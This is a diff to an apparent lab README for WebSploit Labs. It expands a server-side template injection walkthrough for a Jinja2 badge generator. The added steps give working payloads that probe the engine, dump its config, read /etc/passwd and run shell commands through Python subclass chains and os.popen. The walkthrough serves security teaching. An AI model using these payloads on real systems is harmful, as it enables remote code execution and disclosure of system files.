@@ -14,14 +14,30 @@ This lab is part of the WebSploit Labs framework and it is running on the `rende
 Access the lab at `http://10.6.6.41:5021`.
 
 ## Walkthrough
-1. Access the lab at `http://10.6.6.41:5021`.
-2. Enter your name to generate a custom badge.
-3. Observe the template string: `Hello, %s!`.
-4. Try to inject a payload to execute arbitrary code.
-5. Payload: `{{7*7}}`
-6. The output should be `49`.
 
-    
+1. Access the lab at `http://10.6.6.41:5021`.
+2. Enter your name (e.g., "Guest") and click "Preview".
+3. Observe that your input is reflected in the output: `Hello, Guest!`.
+4. Test for SSTI by entering a Jinja2 expression:
+   - Payload: `{{7*7}}`
+   - If vulnerable, the output will show: `Hello, 49!`
+5. Confirm the template engine by checking config:
+   - Payload: `{{config}}`
+6. Escalate to Remote Code Execution (RCE):
+   - Read a file:
+   ```
+   {{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+   ```
+   - Execute commands (find the right subclass index):
+   ```
+   {{''.__class__.__mro__[1].__subclasses__()[213]('id',shell=True,stdout=-1).communicate()}}
+   ```
+7. Alternative RCE payloads:
+   ```
+   {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+   ```
+8. The flag or proof of RCE will be displayed in the output.
+
 ## Explanation
 The application is vulnerable to Server-Side Template Injection because it directly concatenates user input into the template string. This allows an attacker to inject arbitrary code into the template.
 
